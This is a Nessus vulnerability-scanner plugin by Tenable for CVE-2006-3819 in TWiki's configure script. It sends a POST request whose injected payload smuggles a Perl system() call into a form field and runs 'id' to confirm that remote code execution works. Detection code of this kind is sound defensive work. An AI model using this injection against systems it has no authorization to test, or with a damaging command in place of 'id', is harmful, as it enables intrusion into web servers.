#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server includes a CGI script that allows for arbitrary
code execution. 

Description :

The version of TWiki installed on the remote host uses an unsafe
'eval' in the 'bin/configure' script that can be exploited by an
unauthenticated attacker to execute arbitrary Perl code subject to the
privileges of the web server user id. 

See also :

http://twiki.org/cgi-bin/view/Codev/SecurityAlertCmdExecWithConfigure

Solution :

Apply HotFix 2 or later for TWiki 4.0.4 or restrict access to the
TWiki configure script. 

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(22123);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-3819");
  script_bugtraq_id(19188);

  script_name(english:"TWiki configure Script Arbitrary Command Execution Vulnerability");
  script_summary(english:"Tries to run a command using TWiki");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("twiki_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/twiki"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];
  url = string(dir, "/bin/configure");

  # Check whether the affected script exists.
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ('name="action" value="update"' >< res)
  {
    # Try to exploit the flaw to run a command.
    cmd = "id";
    sploit = string("TYPEOF:);system(", cmd, ");my @a=(");
    postdata = string(
      "action=update&",
      urlencode(str:sploit), "=nessus"
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see the code in the XML debug output.
    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line)
    {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus was able execute the command '", cmd, "' on the remote host;\n",
        "it produced the following output :\n",
        "\n",
        line
      );

      security_hole(port:port, data:report);
      exit(0);
    }
  }
}
